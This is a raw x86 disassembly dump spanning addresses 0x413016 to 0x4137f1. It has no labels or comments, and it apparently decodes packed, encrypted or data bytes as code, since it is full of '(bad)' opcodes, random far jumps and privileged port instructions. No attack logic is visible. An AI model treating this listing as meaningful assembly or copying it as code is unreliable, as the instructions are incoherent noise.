  413016:	mov    ds:0x72bbad41,al
  41301b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41301c:	(bad)  
  41301d:	dec    ebp
  41301e:	xchg   ecx,eax
  41301f:	dec    eax
  413020:	jae    0x413055
  413022:	xor    DWORD PTR [edi-0x4d],0xffffffdd
  413026:	pusha  
  413027:	push   ebp
  413028:	adc    eax,0x46519242
  41302d:	lea    esi,ds:0x2459bc7e
  413033:	pop    edi
  413034:	fmul   DWORD PTR [esi+0xa5ee288]
  41303a:	sub    dl,ch
  41303c:	inc    ecx
  41303d:	sub    DWORD PTR fs:[ecx],edi
  413040:	xor    esi,DWORD PTR [ebx+0x69207aca]
  413046:	iret   
  413047:	cli    
  413048:	sbb    DWORD PTR [eax+0x60360a87],0x7bc5ebec
  413052:	xchg   ebx,eax
  413053:	in     eax,0xab
  413055:	pxor   mm0,mm4
  413058:	je     0x41301f
  41305a:	icebp  
  41305b:	xchg   ebp,eax
  41305c:	mov    ch,BYTE PTR [eax+0x60a8b517]
  413062:	mov    bh,0x36
  413064:	pop    ss
  413065:	int    0x20
  413067:	add    eax,0xcb2efa15
  41306c:	add    ebp,DWORD PTR [eax+0x17d150fc]
  413072:	adc    esi,ebp
  413074:	push   cs
  413075:	or     al,0xe6
  413077:	and    ah,BYTE PTR [ebx-0x47fec82d]
  41307d:	stc    
  41307e:	mov    BYTE PTR [eax],cl
  413080:	inc    esi
  413081:	arpl   di,dx
  413083:	jno    0x413094
  413085:	xor    al,0x24
  413087:	or     eax,0x2e146ebe
  41308c:	lea    esi,[edi+0x7b7d49bc]
  413092:	xor    al,0xcb
  413094:	xchg   BYTE PTR [ebx],dh
  413096:	(bad)  
  413097:	popa   
  413098:	sbb    eax,0xba5190f5
  41309d:	pop    DWORD PTR [eax-0x6f959053]
  4130a3:	test   BYTE PTR es:[edx+0x33],dl
  4130a7:	xor    DWORD PTR [esp+edx*4+0x2de9fec0],ebp
  4130ae:	adc    dl,ch
  4130b0:	sub    BYTE PTR ds:0xc7f9e9f2,bl
  4130b6:	dec    ecx
  4130b7:	(bad)  
  4130b8:	push   ss
  4130b9:	gs jmp 0x29bc:0xb64ff4e
  4130c1:	in     eax,0xa5
  4130c3:	pop    esi
  4130c4:	xor    eax,0x787831f8
  4130c9:	into   
  4130ca:	jnp    0x413126
  4130cc:	mov    ecx,0x3386e7eb
  4130d1:	mov    ds:0x29a92480,eax
  4130d6:	sub    ebx,0x63
  4130d9:	adc    cl,BYTE PTR [eax-0x72715a6c]
  4130df:	(bad)  
  4130e0:	sub    eax,0x643400df
  4130e5:	loope  0x413068
  4130e7:	or     esi,DWORD PTR [ebp-0x7]
  4130ea:	or     eax,0x36ae1fb4
  4130ef:	jmp    0xffca8ee7
  4130f4:	jmp    0x28cdd45c
  4130f9:	inc    esp
  4130fa:	add    ah,BYTE PTR [edx]
  4130fc:	sbb    al,0xe0
  4130fe:	cmp    dl,BYTE PTR [ebx-0x383ec9c8]
  413104:	jae    0x4130de
  413106:	xchg   edi,eax
  413107:	int    0x9b
  413109:	inc    ebx
  41310a:	or     DWORD PTR [esp+esi*2+0x21c0b0bc],ecx
  413111:	cdq    
  413112:	cli    
  413113:	sbb    BYTE PTR [edi+ebx*2+0x62],dh
  413117:	sbb    DWORD PTR gs:[edx-0x5ef39cf2],ebp
  41311e:	mov    esi,0xd4928bf3
  413123:	mov    edx,ebx
  413125:	or     BYTE PTR [edi+0x37],bh
  413128:	in     al,0xda
  41312a:	out    0x7b,al
  41312c:	xchg   esp,eax
  41312d:	jge    0x41312a
  41312f:	pop    edi
  413130:	inc    esi
  413131:	add    al,0xd0
  413133:	outs   dx,DWORD PTR ds:[esi]
  413134:	mov    dl,0xc9
  413136:	ds and edi,edi
  413139:	inc    edi
  41313a:	ss pop ebp
  41313c:	loopne 0x41314a
  41313e:	xchg   DWORD PTR [esi],ebp
  413140:	mov    DWORD PTR [edx],esi
  413142:	mov    ch,0xd1
  413144:	jg     0xf954df78
  41314a:	xchg   bh,dl
  41314c:	rcl    eax,0x32
  41314f:	dec    esi
  413150:	retf   0xc13
  413153:	shl    bl,cl
  413155:	sbb    DWORD PTR [eax+0x4a],ebp
  413158:	mov    ds:0x68364e6d,eax
  41315d:	(bad)
  413160:	mov    al,0xb3
  413162:	xchg   DWORD PTR [edi+eax*1-0x78e2c1fc],esi
  413169:	push   ss
  41316a:	lods   eax,DWORD PTR ds:[esi]
  41316b:	fiadd  WORD PTR [ecx+0x21]
  41316e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41316f:	sub    DWORD PTR [edi+0x23c84db1],edi
  413175:	dec    esi
  413176:	aad    0x59
  413178:	xchg   DWORD PTR [ebx-0x58],eax
  41317b:	push   ss
  41317c:	xor    al,0x1b
  41317f:	xchg   ecx,eax
  413180:	adc    al,0x41
  413182:	add    al,0xb7
  413184:	or     al,0x8
  413186:	test   DWORD PTR [ebx-0x2f],0x8bf0b052
  41318d:	lds    esp,FWORD PTR [edx]
  41318f:	pop    ss
  413190:	inc    eax
  413191:	cs jmp 0x63f059c9
  413197:	leave  
  413198:	sbb    ebx,ecx
  41319a:	icebp  
  41319b:	mov    dh,BYTE PTR [ecx]
  41319d:	bound  esp,QWORD PTR [eax+0x43]
  4131a0:	pop    ebp
  4131a1:	(bad)  
  4131a2:	fs or  al,0x7c
  4131a5:	xchg   ebx,eax
  4131a6:	xor    dh,BYTE PTR [edx+0x420f3367]
  4131ac:	jns    0x41316b
  4131ae:	out    0x4a,al
  4131b0:	int    0xb5
  4131b2:	icebp  
  4131b3:	imul   edx,DWORD PTR [edx-0x61],0x26
  4131b7:	test   eax,0xbe94f314
  4131bc:	inc    ebx
  4131bd:	stos   BYTE PTR es:[edi],al
  4131be:	jnp    0x41319c
  4131c0:	outs   dx,DWORD PTR ds:[esi]
  4131c1:	clc    
  4131c2:	push   cs
  4131c3:	sti    
  4131c4:	xchg   ebx,eax
  4131c5:	sbb    edx,DWORD PTR [edi]
  4131c7:	out    0xe7,eax
  4131c9:	arpl   cx,bx
  4131cb:	inc    ebx
  4131cc:	xchg   edi,edi
  4131ce:	jmp    0xda9c5630
  4131d3:	jl     0x4131b2
  4131d5:	mov    edi,0x3eb7f684
  4131da:	sub    ebx,eax
  4131dc:	sahf   
  4131dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131de:	pop    eax
  4131df:	mov    dl,0x1b
  4131e1:	inc    eax
  4131e2:	stos   BYTE PTR es:[edi],al
  4131e3:	pop    esi
  4131e4:	popa   
  4131e5:	cld    
  4131e6:	cli    
  4131e7:	imul   esp,DWORD PTR [esi-0x16],0x42
  4131eb:	leave  
  4131ec:	test   DWORD PTR [edi+0x6f],edx
  4131ef:	call   0xbe01:0xa6b8f659
  4131f6:	cmp    ecx,edx
  4131f8:	out    0x99,eax
  4131fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131fb:	sub    DWORD PTR [ebx+0x733bb22b],edx
  413201:	in     al,dx
  413202:	fcomp  st(5)
  413204:	or     ebp,DWORD PTR [edi+0x9]
  413207:	mov    ds:0x4bb483fe,al
  41320c:	xchg   ebp,eax
  41320d:	sub    edx,DWORD PTR [eax]
  41320f:	popf   
  413210:	pop    esi
  413211:	leave  
  413212:	dec    edx
  413213:	xor    BYTE PTR [eax-0x2b57450f],bh
  413219:	jns    0x413298
  41321b:	dec    ebp
  41321c:	mov    dl,0xaf
  41321e:	cmp    BYTE PTR [ebp+0x7f],ah
  413221:	addr16 push edx
  413223:	pop    edx
  413224:	fild   QWORD PTR [edi+0x413e6f95]
  41322a:	clc    
  41322b:	push   esp
  41322c:	outs   dx,BYTE PTR ds:[esi]
  41322d:	mov    DWORD PTR [eax+edx*1+0x4d],edx
  413231:	call   0x1e114e39
  413236:	sbb    BYTE PTR ds:0x18468777,bl
  41323c:	mov    cl,0x80
  41323e:	pusha  
  41323f:	and    ch,BYTE PTR [eax-0x585e7571]
  413245:	sti    
  413246:	mov    WORD PTR [edx+ebp*8],gs
  413249:	test   ch,bl
  41324b:	add    dh,BYTE PTR [ebx]
  41324d:	(bad)  
  41324e:	(bad)  
  41324f:	pop    ebx
  413250:	shl    BYTE PTR [ecx+0x6015fe87],0x3d
  413257:	sbb    BYTE PTR [ebx],dh
  413259:	test   eax,0xa69e5de8
  41325e:	xor    al,BYTE PTR [ebp+0x643739ec]
  413264:	xor    ebp,DWORD PTR ds:[esi-0x64744fa2]
  41326b:	adc    bh,BYTE PTR ss:[edx+0x7a]
  41326f:	cmp    al,0xe1
  413271:	xor    eax,0xe6b957e8
  413276:	jge    0x4132ad
  413278:	cmc    
  413279:	jecxz  0x4132e6
  41327b:	mov    edx,0xe629bf78
  413280:	xchg   BYTE PTR [ecx],ch
  413282:	enter  0x8f84,0xed
  413286:	inc    edi
  413287:	jl     0x4132b3
  413289:	enter  0xbfe6,0x7a
  41328d:	das    
  41328e:	lea    ecx,[edi-0x5b4c2904]
  413294:	cmc    
  413295:	cmp    ebp,DWORD PTR [ecx]
  413297:	aam    0xcc
  413299:	mov    esi,0xc9091e1e
  41329e:	ins    BYTE PTR es:[edi],dx
  41329f:	hlt    
  4132a0:	pop    ebx
  4132a1:	inc    ebp
  4132a2:	inc    ebp
  4132a3:	xchg   edx,eax
  4132a4:	lods   al,BYTE PTR ds:[esi]
  4132a5:	dec    edi
  4132a6:	xlat   BYTE PTR ds:[ebx]
  4132a7:	xchg   esp,ebp
  4132a9:	test   BYTE PTR [ebx-0x1ab8d34c],ah
  4132af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b0:	push   ebp
  4132b1:	into   
  4132b2:	push   eax
  4132b3:	xchg   ecx,eax
  4132b4:	sub    DWORD PTR [edx-0x13fe5f68],ebp
  4132ba:	or     al,0x2c
  4132bc:	pop    eax
  4132bd:	aad    0x91
  4132bf:	cmp    ch,BYTE PTR [esi]
  4132c1:	(bad)  
  4132c3:	sar    esp,1
  4132c5:	sbb    bh,BYTE PTR ds:0x25bf4116
  4132cb:	ftst   
  4132cd:	cmp    ecx,DWORD PTR ds:0xadcf77c5
  4132d3:	stos   DWORD PTR es:[edi],eax
  4132d4:	and    dl,BYTE PTR [edi-0x611af3f4]
  4132da:	and    BYTE PTR [ebp+0x32a01373],cl
  4132e0:	jne    0x4132a5
  4132e2:	ret    
  4132e3:	das    
  4132e4:	inc    ecx
  4132e5:	xlat   BYTE PTR ds:[ebx]
  4132e6:	push   cs
  4132e7:	pushf  
  4132e8:	mov    al,ds:0x79357555
  4132ed:	clc    
  4132ee:	(bad)  
  4132ef:	xchg   esp,eax
  4132f0:	xor    DWORD PTR [ecx],esp
  4132f2:	int    0x6c
  4132f4:	mov    al,ds:0x6ba0f65f
  4132f9:	(bad)  [ecx+eax*4+0x3e7ec7bd]
  413300:	jecxz  0x4132f1
  413302:	mov    BYTE PTR [eax+0x63],ah
  413305:	cld    
  413306:	pusha  
  413307:	shl    bl,1
  413309:	or     ah,BYTE PTR [edx]
  41330b:	aam    0xff
  41330d:	or     eax,esp
  41330f:	jle    0x4132cf
  413311:	mov    dh,0xca
  413313:	fdiv   st(3),st
  413315:	(bad)  
  413316:	sub    cl,BYTE PTR [ecx-0xb1d59ef]
  41331c:	pusha  
  41331d:	mov    eax,ds:0x49e5be53
  413322:	push   edi
  413323:	dec    edi
  413324:	int    0x92
  413326:	cmp    DWORD PTR [eax-0x9],ecx
  413329:	xchg   esi,eax
  41332a:	mov    al,BYTE PTR [ebx+0x71]
  41332d:	icebp  
  41332e:	lds    eax,FWORD PTR [ebp+0x77]
  413331:	aad    0x64
  413333:	scas   eax,DWORD PTR es:[edi]
  413334:	mov    eax,0x7b0cf260
  413339:	mov    esi,0x9b316825
  41333e:	out    0x69,al
  413340:	adc    al,0x29
  413342:	xchg   edx,eax
  413343:	aaa    
  413344:	or     al,0x4a
  413346:	jge    0x413312
  413348:	jne    0x4133ac
  41334a:	fcomp  QWORD PTR [edi+0x59]
  41334d:	mov    ch,0x7e
  41334f:	jnp    0x41337b
  413351:	loopne 0x4133bb
  413353:	xchg   esp,eax
  413354:	xor    edi,esi
  413356:	jmp    0x3b78bf6e
  41335b:	add    bh,bh
  41335d:	jge    0x41336f
  41335f:	jbe    0x413336
  413361:	add    al,0x31
  413363:	test   eax,0x6db9175e
  413368:	imul   ecx,esi,0xffffffbf
  41336b:	lods   al,BYTE PTR ds:[esi]
  41336c:	repnz pop es
  41336e:	ins    BYTE PTR es:[edi],dx
  41336f:	push   ds
  413370:	fistp  DWORD PTR [eax+0x73]
  413373:	jp     0x41334a
  413375:	pop    ebx
  413376:	mov    bl,0x2
  413378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413379:	and    BYTE PTR [ebp-0x5fcf9ae9],0x49
  413380:	clc    
  413381:	cs leave 
  413383:	jg     0x413353
  413385:	cmp    BYTE PTR [ebp+edi*8-0x3201823e],dl
  41338c:	repnz push cs
  41338e:	call   0x2b30:0x515ee24
  413395:	(bad)  
  413396:	neg    BYTE PTR [esi+0x5aa2e4e2]
  41339c:	push   ds
  41339d:	inc    ecx
  41339e:	out    0x61,al
  4133a0:	cmp    eax,0x8a260839
  4133a5:	retf   
  4133a6:	sti    
  4133a7:	fistp  DWORD PTR [edi]
  4133a9:	xchg   esi,eax
  4133aa:	push   0x11
  4133ac:	repz push eax
  4133ae:	push   0xffffffe1
  4133b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133b1:	sub    bl,BYTE PTR [ebx]
  4133b3:	ret    0xd879
  4133b6:	pop    edx
  4133b8:	lods   eax,DWORD PTR ds:[esi]
  4133ba:	retf   
  4133bb:	or     eax,0x3b11a2a2
  4133c0:	sbb    eax,DWORD PTR [ebx-0x3e]
  4133c3:	fwait
  4133c4:	mov    al,ds:0xf106f0e0
  4133c9:	cmp    eax,0x7d07c2eb
  4133ce:	jp     0x413409
  4133d0:	jnp    0x4133d8
  4133d2:	(bad)  [eax-0x4e]
  4133d5:	into   
  4133d6:	stos   BYTE PTR es:[edi],al
  4133d7:	add    al,0x64
  4133d9:	adc    esp,DWORD PTR [ecx+0x10d1c00d]
  4133df:	and    al,0x5b
  4133e1:	outs   dx,DWORD PTR ds:[esi]
  4133e2:	jnp    0x4133c0
  4133e4:	fs inc ebx
  4133e6:	cdq    
  4133e7:	jbe    0x41344c
  4133e9:	je     0x41337e
  4133eb:	scas   al,BYTE PTR es:[edi]
  4133ec:	dec    esi
  4133ed:	adc    ecx,esp
  4133ef:	push   ebp
  4133f0:	(bad)  
  4133f1:	lods   eax,DWORD PTR ds:[esi]
  4133f3:	imul   esp,DWORD PTR [eax-0x1beab537],0x9658fdaa
  4133fd:	aad    0x5
  4133ff:	xchg   ebp,eax
  413400:	add    dl,BYTE PTR [esi]
  413402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413403:	fidivr DWORD PTR [ecx]
  413405:	pop    edi
  413406:	push   ss
  413407:	mov    al,0xb3
  413409:	mov    ds:0x2299dd2,al
  41340e:	push   ebx
  41340f:	sub    eax,0xcc03fd57
  413414:	sbb    dh,BYTE PTR [ecx+0x59a5d967]
  41341a:	shl    DWORD PTR [ecx+0x75defab9],0x8f
  413421:	shl    BYTE PTR [ebx],1
  413423:	in     al,dx
  413424:	inc    ebx
  413425:	popf   
  413426:	push   0x2e799222
  41342b:	adc    edx,esp
  41342d:	mov    edi,0x2c55c3cf
  413432:	mov    ecx,0xf712188d
  413437:	xchg   ebx,eax
  413438:	ret    0x7063
  41343b:	fnsave [edx]
  41343d:	mov    ch,0xd9
  41343f:	(bad)  
  413441:	push   esp
  413442:	xchg   ebp,eax
  413443:	es clc 
  413445:	jns    0x4133ce
  413447:	inc    edi
  413448:	jb     0x4134b1
  41344a:	ror    BYTE PTR [esi+0x33],0x60
  41344e:	mov    esp,0xd87c50cf
  413453:	scas   al,BYTE PTR es:[edi]
  413454:	and    edi,esi
  413456:	rcr    DWORD PTR [edi],0x41
  413459:	or     eax,0x3b5b1ec8
  41345e:	das    
  41345f:	div    edi
  413461:	fimul  WORD PTR [ecx]
  413463:	icebp  
  413464:	mov    eax,0x96bc77a2
  413469:	jmp    0x413454
  41346b:	xchg   ecx,eax
  41346c:	push   esp
  41346d:	xchg   edx,eax
  41346e:	scas   al,BYTE PTR es:[edi]
  41346f:	inc    BYTE PTR [esi-0x21]
  413472:	pop    edi
  413473:	push   ebp
  413474:	into   
  413475:	stos   DWORD PTR es:[edi],eax
  413476:	ins    BYTE PTR es:[edi],dx
  413477:	sar    BYTE PTR [edi-0x367145d1],0x52
  41347e:	int3   
  41347f:	inc    ecx
  413480:	jmp    0x4134a7
  413482:	pop    esi
  413483:	sbb    BYTE PTR [esi-0x5db33b18],bh
  413489:	mov    dl,0x45
  41348b:	jbe    0x41348e
  41348d:	je     0x413444
  41348f:	mov    ebx,0x5afe4549
  413494:	sbb    BYTE PTR ds:0xfcf5d825,bl
  41349a:	out    0x20,al
  41349c:	loop   0x41344e
  41349e:	sti    
  41349f:	push   ds
  4134a0:	dec    ecx
  4134a1:	dec    eax
  4134a2:	push   esp
  4134a3:	jge    0x41348b
  4134a5:	jbe    0x4134c1
  4134a7:	push   edi
  4134a8:	shl    BYTE PTR [eax+eax*2-0x58764cf3],0xf7
  4134b0:	test   DWORD PTR [ebp+0x73457cee],ecx
  4134b6:	inc    ebx
  4134b7:	je     0x41352c
  4134b9:	add    al,0xee
  4134bb:	call   0x25d7ef58
  4134c0:	jge    0x4134b7
  4134c2:	mov    DWORD PTR [ebp-0x6e277fdd],0xe7580558
  4134cc:	lock into 
  4134ce:	clc    
  4134cf:	or     al,0x41
  4134d1:	add    edi,DWORD PTR [ebx+0x6f]
  4134d4:	mov    ?,WORD PTR [edx-0x2d5322d9]
  4134da:	and    edi,DWORD PTR [esp+ebp*8-0x2a701bc6]
  4134e1:	ja     0x4134d5
  4134e3:	fnstsw WORD PTR [edx]
  4134e5:	pop    esi
  4134e6:	inc    ebp
  4134e7:	adc    DWORD PTR [ebp+esi*8-0x5c],edx
  4134eb:	cmp    dl,BYTE PTR [ebx+0xf]
  4134ee:	xor    ah,BYTE PTR [ebp+0x6b9050e]
  4134f4:	jne    0xc9b61f11
  4134fa:	mov    eax,ds:0x479e91ab
  4134ff:	lds    esp,FWORD PTR [ebx-0x427d176c]
  413505:	xchg   esp,eax
  413506:	sub    eax,DWORD PTR [eax+0x7f]
  413509:	sub    bh,BYTE PTR fs:[edx+0x11]
  41350d:	jae    0x4134e4
  41350f:	mov    eax,ss
  413511:	adc    DWORD PTR cs:[edx-0x25d2d766],0x7ccc913b
  41351c:	push   esi
  41351d:	mov    ah,0xf
  41351f:	sahf   
  413520:	xchg   esp,eax
  413521:	test   BYTE PTR [edi+0x2],dl
  413524:	fcom   QWORD PTR [edi]
  413526:	jnp    0x41353c
  413528:	(bad)  
  413529:	mov    eax,0x62cdff24
  41352e:	and    DWORD PTR [ecx*4+0x5ecb39f1],esi
  413535:	imul   esp,DWORD PTR ds:0x8da9aa04,0x1de5995c
  41353f:	pop    es
  413540:	jae    0x41352c
  413542:	ret    
  413543:	loopne 0x4134d3
  413545:	and    al,0x79
  413547:	(bad)  
  413548:	jbe    0x41359d
  41354a:	repnz pop esi
  41354c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41354d:	outs   dx,DWORD PTR ds:[esi]
  41354e:	push   es
  41354f:	jl     0x413577
  413551:	in     eax,dx
  413552:	cmp    eax,0x145879fa
  413557:	xchg   ebx,eax
  413558:	xchg   ecx,eax
  413559:	mov    eax,ds:0xffc7d499
  41355e:	sub    al,dh
  413560:	cdq    
  413561:	push   ebx
  413562:	cmp    eax,0x712f1a57
  413567:	xchg   esi,eax
  413568:	pop    ebx
  413569:	shr    DWORD PTR [eax+ecx*8+0x61],cl
  41356d:	dec    edi
  41356e:	daa    
  41356f:	and    edi,DWORD PTR [edi-0x64]
  413572:	cmp    DWORD PTR [esp+edi*4],eax
  413575:	out    dx,eax
  413576:	dec    esi
  413577:	dec    ecx
  413578:	adc    ch,BYTE PTR [edi]
  41357a:	mov    bl,0xba
  41357c:	dec    esi
  41357d:	retf   
  41357e:	push   esi
  41357f:	push   edi
  413580:	sbb    al,0xd3
  413582:	clc    
  413583:	jp     0x413582
  413585:	cmp    al,0x23
  413587:	cmp    DWORD PTR ds:0x3720f7,ebx
  41358d:	das    
  41358e:	inc    edi
  41358f:	(bad)
  413593:	cli    
  413594:	xor    bl,BYTE PTR [ebx-0x27]
  413597:	lock dec eax
  413599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41359a:	inc    eax
  41359b:	xchg   DWORD PTR [esi-0x4b821bf4],ecx
  4135a1:	outs   dx,BYTE PTR ds:[esi]
  4135a2:	pop    edx
  4135a3:	data16 (bad) 
  4135a5:	sti    
  4135a6:	pop    edi
  4135a7:	add    ah,BYTE PTR [ebx-0x4]
  4135aa:	lods   al,BYTE PTR ds:[esi]
  4135ab:	mov    ds:0xaab9b1b4,al
  4135b0:	jmp    0xfda8c50
  4135b5:	mov    BYTE PTR [esi+0x10],dh
  4135b8:	sbb    esi,edi
  4135ba:	xlat   BYTE PTR ds:[ebx]
  4135bb:	adc    eax,0x605c3539
  4135c0:	lds    edi,FWORD PTR [ecx+0x5c86e85a]
  4135c6:	out    0x59,eax
  4135c8:	in     eax,dx
  4135c9:	icebp  
  4135ca:	or     al,0x6b
  4135cc:	mov    ebx,0x41e6db84
  4135d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135d2:	mov    BYTE PTR [edi-0x74],bl
  4135d5:	(bad)  
  4135d6:	ins    DWORD PTR es:[edi],dx
  4135d7:	mov    ds:0xde4597f5,eax
  4135dc:	mov    bl,0xbe
  4135de:	pop    edx
  4135df:	shl    edx,1
  4135e1:	test   eax,0xcd245462
  4135e6:	pop    esp
  4135e7:	jmp    0xd507:0x9fb59e7d
  4135ee:	loop   0x41357a
  4135f0:	and    DWORD PTR [ebx],edi
  4135f2:	int    0xcb
  4135f4:	outs   dx,BYTE PTR ds:[esi]
  4135f5:	add    DWORD PTR [edx+ebx*4+0x57],edi
  4135f9:	push   esi
  4135fa:	mov    ch,0xc6
  4135fc:	nop
  4135fd:	repz (bad) 
  4135ff:	rcr    BYTE PTR ds:0x634085dd,1
  413605:	ret    
  413606:	div    ebp
  413608:	push   edi
  413609:	mov    bh,0xf1
  41360b:	jp     0x41359f
  41360d:	in     eax,0xc6
  41360f:	dec    esp
  413610:	cmp    DWORD PTR [ebp+edi*1+0x1fd52b2a],eax
  413617:	jl     0x413635
  413619:	rcl    DWORD PTR [edx-0x67a21600],1
  41361f:	inc    eax
  413620:	loopne 0x4135dc
  413622:	push   ebx
  413623:	ja     0x413648
  413625:	xchg   ebx,eax
  413626:	fild   WORD PTR [ecx-0x65]
  413629:	out    dx,al
  41362a:	xchg   esp,eax
  41362b:	gs mov bl,0x2c
  41362e:	mov    edx,0x7256348a
  413633:	mov    edx,0x7adb87ea
  413638:	jle    0x41364e
  41363a:	inc    edx
  41363b:	leave  
  41363c:	int3   
  41363d:	repz mov dl,0xb8
  413640:	pop    es
  413641:	or     eax,0xcb3cf927
  413646:	jecxz  0x4135d0
  413648:	or     ecx,DWORD PTR [esi+0x50]
  41364b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41364c:	loop   0x41364c
  41364e:	mov    DWORD PTR [edi],0x1eccf5a9
  413654:	(bad)  
  413656:	in     eax,dx
  413657:	je     0x4136d4
  413659:	loopne 0x413616
  41365b:	jecxz  0x4136d3
  41365d:	inc    esp
  41365e:	leave  
  41365f:	push   edi
  413660:	pop    eax
  413661:	cmp    eax,0xdbf8d93a
  413666:	adc    dl,BYTE PTR [ebx+0x3b8c4baa]
  41366c:	bound  eax,QWORD PTR [ebx]
  41366e:	cwde   
  41366f:	jecxz  0x413665
  413671:	jnp    0x4135fc
  413673:	and    eax,0xa600eb45
  413678:	mov    al,ds:0x899a82b
  41367d:	dec    edx
  41367e:	add    ebx,DWORD PTR [edx-0x290f2a68]
  413684:	xchg   ecx,eax
  413685:	mov    ebx,edx
  413687:	dec    ebp
  413688:	mov    bl,0xa9
  41368a:	enter  0x3b1a,0x7a
  41368e:	ret    0xae7e
  413691:	cli    
  413692:	(bad)  
  413693:	cmp    BYTE PTR [esi+0x4a31eaf5],dl
  413699:	or     al,0xdf
  41369b:	xchg   DWORD PTR [ebp-0x5a],edx
  41369e:	adc    BYTE PTR [edx],bl
  4136a0:	push   0xefee0cf8
  4136a5:	lock sbb ebp,DWORD PTR [ecx-0x21]
  4136a9:	push   es
  4136aa:	cmp    DWORD PTR [edi],ebp
  4136ac:	mov    ds,WORD PTR [eax+eax*4-0x1e72cd52]
  4136b3:	xchg   ebp,eax
  4136b4:	cmp    BYTE PTR [ecx],dl
  4136b6:	rcl    DWORD PTR [ebx+0x10899658],0x9c
  4136bd:	cmc    
  4136be:	popa   
  4136bf:	cmc    
  4136c0:	xlat   BYTE PTR ds:[ebx]
  4136c1:	repnz imul esp,DWORD PTR [eax],0x7cc96174
  4136c8:	mov    ah,0x96
  4136ca:	xor    eax,0x577bbfca
  4136cf:	xor    BYTE PTR [edx+0x16],0x48
  4136d3:	jne    0x413672
  4136d5:	sbb    al,BYTE PTR [esi]
  4136d7:	cmp    ebx,DWORD PTR [ebp+ebp*2-0x7d]
  4136db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136dc:	sbb    al,0x57
  4136de:	das    
  4136df:	sbb    dh,cl
  4136e1:	xchg   ecx,eax
  4136e2:	pop    edi
  4136e3:	and    al,0x3f
  4136e5:	jg     0x4136c1
  4136e7:	call   0xe245948a
  4136ec:	mov    edx,0x71b16ecc
  4136f1:	jmp    0x4136f0
  4136f3:	shl    BYTE PTR [esi+ebx*8+0x4c],cl
  4136f7:	das    
  4136f8:	and    eax,0x8097a024
  4136fd:	xor    esp,eax
  4136ff:	outs   dx,BYTE PTR ds:[esi]
  413700:	icebp  
  413701:	je     0x413712
  413703:	popa   
  413704:	push   esp
  413705:	(bad)  
  413706:	dec    edi
  413707:	pop    es
  413708:	sub    al,0xe2
  41370a:	push   cs
  41370b:	mov    eax,ds:0x24fe7423
  413710:	cld    
  413711:	xchg   DWORD PTR [eax+0x2a8292bc],esp
  413717:	cmc    
  413718:	add    dh,bh
  41371a:	sahf   
  41371b:	out    0xc6,al
  41371d:	test   BYTE PTR [eax-0x3ee38ae0],cl
  413723:	sbb    ah,bh
  413725:	sbb    dh,dh
  413727:	or     BYTE PTR [ebp+0x3e8fc742],ah
  41372d:	fwait
  41372e:	xor    edx,DWORD PTR [ebp-0x7a9e09f0]
  413734:	loope  0x4136eb
  413736:	test   al,0xc5
  413738:	jmp    0x54759d3c
  41373d:	mov    ch,0x5d
  41373f:	loopne 0x4137a7
  413741:	mov    dl,0x4f
  413743:	push   cs
  413744:	test   bl,bh
  413746:	mov    WORD PTR [edx-0x6fc11594],fs
  41374c:	je     0x4137b1
  41374e:	push   0x3e
  413750:	ins    DWORD PTR es:[edi],dx
  413751:	push   eax
  413752:	inc    ebp
  413753:	retf   
  413754:	lods   al,BYTE PTR ds:[esi]
  413755:	pop    ecx
  413756:	inc    ebx
  413757:	test   BYTE PTR [edx-0x529d20c7],0x88
  41375e:	and    DWORD PTR [edx-0x438b30b9],edi
  413764:	dec    ebp
  413765:	add    DWORD PTR [esi],eax
  413767:	shl    DWORD PTR [edi+0x4fa32b3d],0xf5
  41376e:	ds cmp eax,0x3c24d956
  413774:	inc    eax
  413775:	shr    BYTE PTR [edx+eax*4],cl
  413778:	adc    DWORD PTR [ecx+0x570a3890],esi
  41377e:	out    0x20,eax
  413780:	mov    bh,0x8
  413782:	cmc    
  413783:	ins    BYTE PTR es:[edi],dx
  413784:	lds    esp,FWORD PTR [eax]
  413786:	in     eax,0xbd
  413788:	ret    0x9733
  41378b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41378c:	add    eax,0x3d06344b
  413791:	jne    0x4137e2
  413793:	jbe    0x413715
  413795:	inc    ecx
  413796:	sub    al,0xd1
  413798:	imul   eax,DWORD PTR [ecx*2-0x6075b87f],0xe5b30573
  4137a3:	xlat   BYTE PTR ds:[ebx]
  4137a4:	call   0xc074:0xa87bcf2a
  4137ab:	mov    ebx,0x3bbc0123
  4137b0:	inc    edx
  4137b1:	jecxz  0x41377e
  4137b3:	inc    esp
  4137b4:	rcl    cl,0x33
  4137b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137b8:	pop    ebx
  4137b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ba:	jo     0x4137e5
  4137bc:	cmc    
  4137bd:	(bad)  
  4137be:	fisubr DWORD PTR [esi+0x27fe04e8]
  4137c4:	sbb    eax,0xe504a8af
  4137c9:	(bad)  
  4137ca:	jb     0x413814
  4137cc:	mov    cl,0x28
  4137ce:	jecxz  0x413793
  4137d0:	std    
  4137d1:	pop    ebx
  4137d2:	and    cl,BYTE PTR [ebx-0x4a]
  4137d5:	xchg   ecx,eax
  4137d6:	sbb    al,0xcd
  4137d8:	out    0xf4,al
  4137da:	xor    eax,0x522b5a52
  4137df:	pop    edi
  4137e0:	push   ss
  4137e1:	xchg   esi,esp
  4137e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e4:	cmp    BYTE PTR [ecx-0x757e9446],dl
  4137ea:	pop    edx
  4137eb:	in     eax,dx
  4137ec:	out    dx,al
  4137ed:	and    DWORD PTR [esi+0x4a],edi
  4137f0:	pop    ebx
  4137f1:	or     DWORD PTR [esi],edi
